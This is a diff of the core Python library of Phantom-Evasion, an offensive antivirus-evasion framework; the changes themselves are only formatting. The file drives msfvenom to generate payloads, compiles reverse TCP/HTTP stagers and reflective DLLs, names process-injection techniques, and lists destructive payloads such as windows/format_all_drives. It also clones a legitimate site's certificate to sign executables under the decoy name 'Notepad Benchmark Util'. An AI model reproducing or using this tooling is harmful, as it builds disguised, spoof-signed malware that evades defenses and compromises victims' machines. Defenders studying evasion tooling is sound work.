@@ -1,45 +1,44 @@
+########################################################################################
+#                                                                                      #
+#    This file is part of Phantom-Evasion.                                             #
+#                                                                                      #
+#    Phantom-Evasion is free software: you can redistribute it and/or modify           #
+#    it under the terms of the GNU General Public License as published by              #
+#    the Free Software Foundation, either version 3 of the License, or                 #
+#    (at your option) any later version.                                               #
+#                                                                                      #
+#    Phantom-Evasion is distributed in the hope that it will be useful,                #
+#    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
+#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
+#    GNU General Public License for more details.                                      #
+#                                                                                      #
+#    You should have received a copy of the GNU General Public License                 #
+#    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
+#                                                                                      #
+########################################################################################
 
 
-
-     ########################################################################################
-     #                                                                                      #
-     #    This file is part of Phantom-Evasion.                                             #
-     #                                                                                      #
-     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
-     #    it under the terms of the GNU General Public License as published by              #
-     #    the Free Software Foundation, either version 3 of the License, or                 #
-     #    (at your option) any later version.                                               #
-     #                                                                                      #
-     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
-     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
-     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
-     #    GNU General Public License for more details.                                      #
-     #                                                                                      #  
-     #    You should have received a copy of the GNU General Public License                 #
-     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
-     #                                                                                      #
-     ########################################################################################
-
-
-import subprocess,sys
-import os,platform
+import subprocess, sys
+import os, platform
 import random
 import string
 import argparse
 from OpenSSL import crypto
-#from sys import argv, platform
+# from sys import argv, platform
 import ssl
-from time import sleep 
+from time import sleep
 from shutil import rmtree
 from random import shuffle
 import multiprocessing
 from Setup_lib import AutoSetup
 
-sys.path.insert(0,"Modules/payloads")
-sys.path.insert(0,"Modules/post-exploitation")
+sys.path.insert(0, "Modules/payloads")
+sys.path.insert(0, "Modules/post-exploitation")
 sys.dont_write_bytecode = True
 
-Remote_methods = ["ThreadExecutionHijack","TEH","Processinject","PI","EarlyBird","EB","ReflectiveDll","RD","EntryPointHijack","EPH","APCSpray","APCS"]
+Remote_methods = ["ThreadExecutionHijack", "TEH", "Processinject", "PI", "EarlyBird", "EB", "ReflectiveDll", "RD",
+                  "EntryPointHijack", "EPH", "APCSpray", "APCS"]
+
 
 class bcolors:
     PURPLE = '\033[95m'
@@ -52,24 +51,28 @@ class bcolors:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
 
+
 def PythonBanner():
-    py_version=platform.python_version()
+    py_version = platform.python_version()
     print(bcolors.RED + bcolors.BOLD + "[>] Using Python Version: " + bcolors.ENDC + bcolors.ENDC + py_version)
 
+
 def RandString():
-    return ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in range(random.randint(8,18)))
+    return ''.join(random.SystemRandom().choice(string.ascii_lowercase + string.ascii_uppercase) for _ in
+                   range(random.randint(8, 18)))
+
 
 def Enter2Continue():
-    try:   
-        ans=input("\n[>] Press Enter to continue") 
+    try:
+        ans = input("\n[>] Press Enter to continue")
     except SyntaxError:
         pass
 
     pass
 
-def InputFunc(Text):
 
-    py_version=platform.python_version()
+def InputFunc(Text):
+    py_version = platform.python_version()
 
     if py_version[0] == "3":
         Ans = input(Text)
@@ -77,9 +80,11 @@ def InputFunc(Text):
         Ans = raw_input(Text)
     return Ans
 
+
 def Advisor():
-    print(bcolors.RED + bcolors.BOLD + "\n[<DISCLAIMER>]: " + bcolors.ENDC + bcolors.ENDC + "Phantom-Evasion is intended to be used for legal security")
-    print("purposes only any other use is not under the responsibility of the developer\n") 
+    print(
+        bcolors.RED + bcolors.BOLD + "\n[<DISCLAIMER>]: " + bcolors.ENDC + bcolors.ENDC + "Phantom-Evasion is intended to be used for legal security")
+    print("purposes only any other use is not under the responsibility of the developer\n")
     sleep(0.2)
     print(bcolors.RED + bcolors.BOLD + "[>] Author:" + bcolors.ENDC + bcolors.ENDC + " Diego Cornacchini (oddcod3) \n")
     sleep(0.2)
@@ -89,15 +94,16 @@ def Advisor():
     sleep(0.2)
     PythonBanner()
     sleep(3)
-    
+
 
 def Clear():
-    subprocess.Popen( "cls" if platform.system() == "Windows" else "clear", shell=True)
+    subprocess.Popen("cls" if platform.system() == "Windows" else "clear", shell=True)
     sleep(0.1)
 
+
 def Banner():
-    bann= "\n\n"
-    bann += "                       _                 _                        \n" 
+    bann = "\n\n"
+    bann += "                       _                 _                        \n"
     bann += "                 _ __ | |__   __ _ _ __ | |_ ___  _ __ ___        \n"
     bann += "                | '_ \| '_ \ / _` | '_ \| __/ _ \| '_ ` _ \       \n"
     bann += "                | |_) | | | | (_| | | | | || (_) | | | | | |      \n"
@@ -107,14 +113,14 @@ def Banner():
     bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
     bann += "                                                        v3.0      \n"
     sleep(0.3)
-    print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
-  
-def ExitBanner():
+    print(bcolors.RED + bcolors.BOLD + bann + bcolors.ENDC + bcolors.ENDC)
 
+
+def ExitBanner():
     print("      *     .--. .-,       .-..-.__                ___        *              ")
-    print("  .       .'(`.-` \_.-'-./`  |\_( \"\__   *        /   \           .         ")     
+    print("  .       .'(`.-` \_.-'-./`  |\_( \"\__   *        /   \           .         ")
     print("       __.>\ ';  _;---,._|   / __/`'--)          / \ / \                *    ")
-    print("      /.--.  : |/' _.--.<|  /  | |              |   @   |       *            ")                                    
+    print("      /.--.  : |/' _.--.<|  /  | |              |   @   |       *            ")
     print("  _..-'    `\     /' /`  /_/ _/_/             , |       | ,                  ")
     print(" >_.-``-. `Y  /' _;---.`|/))))      *         \/(       )\/        .         ")
     print("'` .-''. \|:  \.'   __, .-'\"`                   | )   ( |                   ")
@@ -126,111 +132,119 @@ def ExitBanner():
     print("          |:.   |                |   RIP     |   |_.'                        ")
     print("          :. :  |                |   here    |                               ")
     print("         ,... : ;                | 31/10/2017|                               ")
-    print("-.\"-/\\\/:::.    `\.\"-._-_'.\"-\"_\\-|...........|///..-..--.-.-.-..-..-\"-..-") 
+    print("-.\"-/\\\/:::.    `\.\"-._-_'.\"-\"_\\-|...........|///..-..--.-.-.-..-..-\"-..-")
 
 
 def MenuOptions():
-
     print("    =====================================================================")
-    print("  ||"+ bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                  || ")
+    print(
+        "  ||" + bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                  || ")
     print("  ||                                 ||                                  || ")
-    print("  ||    [" + bcolors.OCRA + "1" + bcolors.ENDC + "]  Windows modules         ||   [" + bcolors.OCRA + "5" + bcolors.ENDC + "]  Priv-Esc modules          || ")
+    print(
+        "  ||    [" + bcolors.OCRA + "1" + bcolors.ENDC + "]  Windows modules         ||   [" + bcolors.OCRA + "5" + bcolors.ENDC + "]  Priv-Esc modules          || ")
     print("  ||                                 ||                                  || ")
-    print("  ||    [" + bcolors.OCRA + "2" + bcolors.ENDC + "]  Linux modules           ||   [" + bcolors.OCRA + "6" + bcolors.ENDC + "]  Post-Ex modules           || ")
+    print(
+        "  ||    [" + bcolors.OCRA + "2" + bcolors.ENDC + "]  Linux modules           ||   [" + bcolors.OCRA + "6" + bcolors.ENDC + "]  Post-Ex modules           || ")
     print("  ||                                 ||                                  || ")
-    print("  ||    [" + bcolors.OCRA + "3" + bcolors.ENDC + "]  Android modules         ||   [" + bcolors.OCRA + "7" + bcolors.ENDC + "]  Setup                     || ")
+    print(
+        "  ||    [" + bcolors.OCRA + "3" + bcolors.ENDC + "]  Android modules         ||   [" + bcolors.OCRA + "7" + bcolors.ENDC + "]  Setup                     || ")
     print("  ||                                 ||                                  || ")
-    print("  ||    [" + bcolors.OCRA + "4" + bcolors.ENDC + "]  Persistence modules     ||   [" + bcolors.OCRA + "0" + bcolors.ENDC + "]  Exit                      || ")
+    print(
+        "  ||    [" + bcolors.OCRA + "4" + bcolors.ENDC + "]  Persistence modules     ||   [" + bcolors.OCRA + "0" + bcolors.ENDC + "]  Exit                      || ")
     print("  ||                                 ||                                  || ")
     print("    =====================================================================")
 
 
-def PayloadAdvisor(payload,module_choice):
+def PayloadAdvisor(payload, module_choice):
     if "windows" in payload:
         print("[>] Invalid Payload\n")
         print("[Warning] The following list of payloads needs to be supplied using \ncustom shellcode options:\n")
-        print("> windows/format_all_drives \n> windows/exec\n> windows/download_exec \n> windows/dns_txt_query_exec \n> windows/dllinject/find_tag")
-        print("> windows/vncinject/find_tag\n> windows/speak_pwned\n> windows/shell/find_tag\n> windows/patchupmeterpreter/find_tag") 
-        print("> windows/patchupmeterpreter/find_tag \n> windows/patchupdllinject/find_tag\n> windows/messagebox\n> windows/loadlibrary")
+        print(
+            "> windows/format_all_drives \n> windows/exec\n> windows/download_exec \n> windows/dns_txt_query_exec \n> windows/dllinject/find_tag")
+        print(
+            "> windows/vncinject/find_tag\n> windows/speak_pwned\n> windows/shell/find_tag\n> windows/patchupmeterpreter/find_tag")
+        print(
+            "> windows/patchupmeterpreter/find_tag \n> windows/patchupdllinject/find_tag\n> windows/messagebox\n> windows/loadlibrary")
         print("\n[>] including respective x64 payloads\n")
     elif "linux" in payload:
         print("[>] Invalid Payload\n")
         print("[Warning] The following list of payloads needs to be supplied using \ncustom shellcode options:\n")
-        print("> linux/x86/shell_find_tag\n> linux/x86/shell_find_port\n> linux/x86/shell/find_tag\n> linux/x86/read_file \n> linux/x86/meterpreter/find_tag")
-        print("> linux/x86/exec\n> linux/x86/chmod\n> linux/x86/adduser\n") 
+        print(
+            "> linux/x86/shell_find_tag\n> linux/x86/shell_find_port\n> linux/x86/shell/find_tag\n> linux/x86/read_file \n> linux/x86/meterpreter/find_tag")
+        print("> linux/x86/exec\n> linux/x86/chmod\n> linux/x86/adduser\n")
         print("\n[>] including respective x64 payloads\n")
     Enter2Continue()
+
+
 #    if ("Powershell" in module_choice):
 #        powershell_completer(module_choice)
 #    else:
 #        shellcode_completer(module_choice)
 
-def PayloadGenerator(msfvenom_payload,arch,Host,Port,CustomOpt,payload_format):
-#def PayloadGenerator(ModOpt):
+def PayloadGenerator(msfvenom_payload, arch, Host, Port, CustomOpt, payload_format):
+    # def PayloadGenerator(ModOpt):
 
-    py_version=platform.python_version()
+    py_version = platform.python_version()
 
     if payload_format == "c":
 
         if arch == "x86":
-
-            ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,]
+            ARGs = ['msfvenom', '-p', msfvenom_payload, Host, Port, '-a', arch, ]
 
         if arch == "x64":
-
-            ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch,]
+            ARGs = ['msfvenom', '-p', msfvenom_payload, Host, Port, '-a', arch, ]
 
         if CustomOpt != "":
-
-            CustomOpt=CustomOpt.split()
+            CustomOpt = CustomOpt.split()
             ARGs += CustomOpt
 
-        ARGs += ['-f','c']
+        ARGs += ['-f', 'c']
 
     elif payload_format == "psh" or payload_format == "apk":
 
-        ARGs = ['msfvenom','-p',msfvenom_payload,Host,Port,'-a',arch]
+        ARGs = ['msfvenom', '-p', msfvenom_payload, Host, Port, '-a', arch]
 
         if CustomOpt != "":
-            CustomOpt=CustomOpt.split()
+            CustomOpt = CustomOpt.split()
             ARGs += CustomOpt
 
         if payload_format == "apk":
 
-            ARGs += ['-f','raw','-o','msf_gen.apk']
+            ARGs += ['-f', 'raw', '-o', 'msf_gen.apk']
         else:
-            ARGs += ['-f','psh']
+            ARGs += ['-f', 'psh']
 
     if py_version[0] == "3":
 
         if platform.system() == "Windows":
 
-            Payload = subprocess.run(ARGs,shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+            Payload = subprocess.run(ARGs, shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
         else:
-            Payload = subprocess.run(ARGs,stdout=subprocess.PIPE).stdout.decode('utf-8')
+            Payload = subprocess.run(ARGs, stdout=subprocess.PIPE).stdout.decode('utf-8')
     else:
         if platform.system() == "Windows":
 
-            Payload = subprocess.check_output(ARGs,shell=True)
+            Payload = subprocess.check_output(ARGs, shell=True)
         else:
             Payload = subprocess.check_output(ARGs)
 
     return Payload
 
-#def AutoCompiler(module_type,arch,filename,link = "",ref=False):
-def AutoCompiler(M_type,ModOpt):
+    # def AutoCompiler(module_type,arch,filename,link = "",ref=False):
 
+
+def AutoCompiler(M_type, ModOpt):
     Os_used = platform.system()
 
     if Os_used == "Linux" or Os_used == "Darwin":
 
         if "windows" in M_type:
 
-            if "ReverseTcpStager_C" in M_type or "ReverseHttpStager_C" in M_type or M_type in ["WRT","WRH"]:
+            if "ReverseTcpStager_C" in M_type or "ReverseHttpStager_C" in M_type or M_type in ["WRT", "WRH"]:
 
                 ModOpt["Link"] = "winsock"
 
-            elif "ReverseHttpsStager_C" in M_type or "DownloadExec" in M_type or M_type in ["WRS","WDD","WDE"]:
+            elif "ReverseHttpsStager_C" in M_type or "DownloadExec" in M_type or M_type in ["WRS", "WDD", "WDE"]:
 
                 ModOpt["Link"] = "wininet"
             else:
@@ -239,7 +253,7 @@ def AutoCompiler(M_type,ModOpt):
             if ModOpt["Arch"] == "x86":
 
                 Compiler = "i686-w64-mingw32-gcc"
-            else:             
+            else:
                 Compiler = "x86_64-w64-mingw32-gcc"
 
             if ".exe" in ModOpt["Outfile"]:
@@ -248,25 +262,31 @@ def AutoCompiler(M_type,ModOpt):
 
                     if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                        subprocess.call([Compiler,ModOpt["Resfile"],'Source.c','-o',ModOpt["Outfile"],'-mwindows','-Wno-cpp'])
+                        subprocess.call(
+                            [Compiler, ModOpt["Resfile"], 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-Wno-cpp'])
                     else:
-                        subprocess.call([Compiler,'Source.c','-o',ModOpt["Outfile"],'-mwindows'])
+                        subprocess.call([Compiler, 'Source.c', '-o', ModOpt["Outfile"], '-mwindows'])
 
                 elif ModOpt["Link"] == "wininet":
 
                     if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                        subprocess.call([Compiler,ModOpt["Resfile"],'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lwininet','-Wno-cpp'])
+                        subprocess.call(
+                            [Compiler, ModOpt["Resfile"], 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-lwininet',
+                             '-Wno-cpp'])
                     else:
-                        subprocess.call([Compiler,'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lwininet'])
+                        subprocess.call([Compiler, 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-lwininet'])
 
                 elif ModOpt["Link"] == "winsock":
 
                     if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                        subprocess.call([Compiler,ModOpt["Resfile"],'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lws2_32','-Wno-cpp']) 
+                        subprocess.call(
+                            [Compiler, ModOpt["Resfile"], 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-lws2_32',
+                             '-Wno-cpp'])
                     else:
-                        subprocess.call([Compiler,'Source.c','-o',ModOpt["Outfile"],'-mwindows','-lws2_32','-Wno-cpp']) 
+                        subprocess.call(
+                            [Compiler, 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-lws2_32', '-Wno-cpp'])
 
             if ".dll" in ModOpt["Outfile"]:
 
@@ -276,20 +296,31 @@ def AutoCompiler(M_type,ModOpt):
 
                         if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o',ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])
+                            subprocess.call([Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'ReflectiveLoader.c', 'Source.c',
+                                             '-mwindows', '-lws2_32', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'ReflectiveLoader.o', ModOpt["Resfile"],
+                                 'Source.o', '-mwindows', '-lws2_32', '-Wno-cpp'])
                         else:
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o','Source.o','-mwindows','-lws2_32','-Wno-cpp'])
+                            subprocess.call([Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'ReflectiveLoader.c', 'Source.c',
+                                             '-mwindows', '-lws2_32', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'ReflectiveLoader.o', 'Source.o',
+                                 '-mwindows', '-lws2_32', '-Wno-cpp'])
                     else:
 
                         if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],ModOpt["Resfile"],'Source.o','-mwindows','-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'Source.c', '-mwindows', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], ModOpt["Resfile"], 'Source.o',
+                                 '-mwindows', '-Wno-cpp'])
                         else:
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'Source.o','-mwindows','-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'Source.c', '-mwindows', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'Source.o', '-mwindows', '-Wno-cpp'])
 
                 elif ModOpt["Link"] == "wininet":
 
@@ -297,52 +328,80 @@ def AutoCompiler(M_type,ModOpt):
 
                         if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o',ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])
+                            subprocess.call([Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'ReflectiveLoader.c', 'Source.c',
+                                             '-mwindows', '-lws2_32', '-lwininet', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'ReflectiveLoader.o', ModOpt["Resfile"],
+                                 'Source.o', '-mwindows', '-lws2_32', '-lwininet', '-Wno-cpp'])
 
                         else:
 
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o','Source.o','-mwindows','-lws2_32','-lwininet','-Wno-cpp'])
+                            subprocess.call([Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'ReflectiveLoader.c', 'Source.c',
+                                             '-mwindows', '-lws2_32', '-lwininet', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'ReflectiveLoader.o', 'Source.o',
+                                 '-mwindows', '-lws2_32', '-lwininet', '-Wno-cpp'])
                     else:
 
                         if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lwininet','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],ModOpt["Resfile"],'Source.o','-mwindows','-lwininet','-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'Source.c', '-mwindows', '-lwininet',
+                                 '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], ModOpt["Resfile"], 'Source.o',
+                                 '-mwindows', '-lwininet', '-Wno-cpp'])
                         else:
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lwininet','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'Source.o','-mwindows','-lwininet','-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'Source.c', '-mwindows', '-lwininet',
+                                 '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'Source.o', '-mwindows', '-lwininet',
+                                 '-Wno-cpp'])
 
                 elif ModOpt["Link"] == "winsock":
 
                     if ModOpt["Reflective"] == True:
 
-                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:  
+                        if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o',ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])
-                        else:                  
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','ReflectiveLoader.c','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'ReflectiveLoader.o','Source.o','-mwindows','-lws2_32','-Wno-cpp'])
+                            subprocess.call([Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'ReflectiveLoader.c', 'Source.c',
+                                             '-mwindows', '-lws2_32', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'ReflectiveLoader.o', ModOpt["Resfile"],
+                                 'Source.o', '-mwindows', '-lws2_32', '-Wno-cpp'])
+                        else:
+                            subprocess.call([Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'ReflectiveLoader.c', 'Source.c',
+                                             '-mwindows', '-lws2_32', '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'ReflectiveLoader.o', 'Source.o',
+                                 '-mwindows', '-lws2_32', '-Wno-cpp'])
                     else:
 
                         if "ShellRes" in ModOpt and ModOpt["ShellRes"] == True:
 
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],ModOpt["Resfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])
-                        else:     
-                            subprocess.call([Compiler,'-c','-DBUILDING_EXAMPLE_DLL','Source.c','-mwindows','-lws2_32','-Wno-cpp'])
-                            subprocess.call([Compiler,'-shared','-o',ModOpt["Outfile"],'Source.o','-mwindows','-lws2_32','-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'Source.c', '-mwindows', '-lws2_32',
+                                 '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], ModOpt["Resfile"], 'Source.o',
+                                 '-mwindows', '-lws2_32', '-Wno-cpp'])
+                        else:
+                            subprocess.call(
+                                [Compiler, '-c', '-DBUILDING_EXAMPLE_DLL', 'Source.c', '-mwindows', '-lws2_32',
+                                 '-Wno-cpp'])
+                            subprocess.call(
+                                [Compiler, '-shared', '-o', ModOpt["Outfile"], 'Source.o', '-mwindows', '-lws2_32',
+                                 '-Wno-cpp'])
 
 
         elif "linux" in M_type and ModOpt["Arch"] == "x86":
 
-            subprocess.call(['gcc','Source.c','-lm','-o',ModOpt["Outfile"],'-lpthread','-m32','-static'])
+            subprocess.call(['gcc', 'Source.c', '-lm', '-o', ModOpt["Outfile"], '-lpthread', '-m32', '-static'])
 
         elif "linux" in M_type and ModOpt["Arch"] == "x64":
 
-            subprocess.call(['gcc','Source.c','-lm','-o',ModOpt["Outfile"],'-lpthread','-static'])
+            subprocess.call(['gcc', 'Source.c', '-lm', '-o', ModOpt["Outfile"], '-lpthread', '-static'])
 
     elif Os_used == "Windows":
 
@@ -352,29 +411,36 @@ def AutoCompiler(M_type,ModOpt):
 
             if link == "":
 
-                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-m32','-no-pie'],shell=True)
-            
+                subprocess.call(['gcc', 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-m32', '-no-pie'],
+                                shell=True)
+
             elif link == "wininet":
 
-                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-m32','-no-pie','-lwininet'],shell=True)
+                subprocess.call(
+                    ['gcc', 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-m32', '-no-pie', '-lwininet'],
+                    shell=True)
 
             elif link == "winsock":
 
-                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-m32','-no-pie','-lws2_32'],shell=True)
+                subprocess.call(
+                    ['gcc', 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-m32', '-no-pie', '-lws2_32'],
+                    shell=True)
 
         elif "windows" in M_type and ModOpt["Arch"] == "x64":
 
             if link == "":
 
-                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-no-pie'],shell=True)
-            
+                subprocess.call(['gcc', 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-no-pie'], shell=True)
+
             elif link == "wininet":
 
-                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-no-pie','-lwininet'],shell=True)
+                subprocess.call(['gcc', 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-no-pie', '-lwininet'],
+                                shell=True)
 
             elif link == "winsock":
 
-                subprocess.call(['gcc','Source.c','-o',ModOpt["Outfile"],'-mwindows','-no-pie','-lws2_32'],shell=True)
+                subprocess.call(['gcc', 'Source.c', '-o', ModOpt["Outfile"], '-mwindows', '-no-pie', '-lws2_32'],
+                                shell=True)
 
         elif "linux" in M_type and ModOpt["Arch"] == "x86":
 
@@ -384,43 +450,40 @@ def AutoCompiler(M_type,ModOpt):
 
             print("Autocompile not supported use cygwin to compile source code")
 
+
 def StripBin(ModOpt):
-
     if ModOpt["Strip"] == True:
-
         print(bcolors.GREEN + "\n[>] Strip binary...\n" + bcolors.ENDC)
 
-        subprocess.call(['strip',ModOpt["Outfile"]])
+        subprocess.call(['strip', ModOpt["Outfile"]])
 
 
-def ExeSigner(Filename,Spoofcert,descr="Notepad Benchmark Util"):
+def ExeSigner(Filename, Spoofcert, descr="Notepad Benchmark Util"):
     print(bcolors.OCRA + bcolors.BOLD + "\n[>] Sign Executable \n" + bcolors.ENDC + bcolors.ENDC)
     cert_dir = ""
-    cert_ready=False
+    cert_ready = False
 
     if os.path.exists("Setup/Sign_certs") and (len(os.listdir("Setup/Sign_certs")) > 1):
 
         CertsList = os.listdir("Setup/Sign_certs")
-                
+
         for certfile in CertsList:
 
             if Spoofcert.split(":")[0] in certfile:
-
-                ClonedCert="Setup/Sign_certs/" + certfile[:-4] + ".crt"
-                ClonedKey = "Setup/Sign_certs/"  + certfile[:-4] +  ".key"
+                ClonedCert = "Setup/Sign_certs/" + certfile[:-4] + ".crt"
+                ClonedKey = "Setup/Sign_certs/" + certfile[:-4] + ".key"
                 PfxFile = "Setup/Sign_certs/" + certfile[:-4] + ".pfx"
-                cert_ready=True
+                cert_ready = True
                 break
 
     elif not os.path.exists("Setup/Sign_certs"):
 
         os.makedirs("Setup/Sign_certs")
-               
-    if not cert_ready:
 
+    if not cert_ready:
         host = Spoofcert.split(":")[0]
         port = int(Spoofcert.split(":")[1] or "443")
-        online_cert = ssl.get_server_certificate((host,port))
+        online_cert = ssl.get_server_certificate((host, port))
         x509 = crypto.load_certificate(crypto.FILETYPE_PEM, online_cert)
         keygen = crypto.PKey()
         keygen.generate_key(crypto.TYPE_RSA, ((x509.get_pubkey()).bits()))
@@ -447,14 +510,17 @@ def ExeSigner(Filename,Spoofcert,descr="Notepad Benchmark Util"):
     if (platform.system() == "Windows"):
 
         print("\n[>] Signing " + Filename + " with signtool.exe...")
-        print(subprocess.check_output("signtool.exe sign /v /f " + PfxFile + " /d \"" + descr + "\" /tr \"http://sha256timestamp.ws.symantec.com/sha256/timestamp\" /td SHA256 /fd SHA256 " + Filename, shell=True).decode())
+        print(subprocess.check_output(
+            "signtool.exe sign /v /f " + PfxFile + " /d \"" + descr + "\" /tr \"http://sha256timestamp.ws.symantec.com/sha256/timestamp\" /td SHA256 /fd SHA256 " + Filename,
+            shell=True).decode())
 
     else:
-        Fileform=Filename.split(".")
-        Tmpfile="Ready2Sign." + Fileform[len(Fileform)-1]
-        os.rename(Filename,Tmpfile)
+        Fileform = Filename.split(".")
+        Tmpfile = "Ready2Sign." + Fileform[len(Fileform) - 1]
+        os.rename(Filename, Tmpfile)
         print("\n[>] Signing " + Filename + " with osslsigncode...")
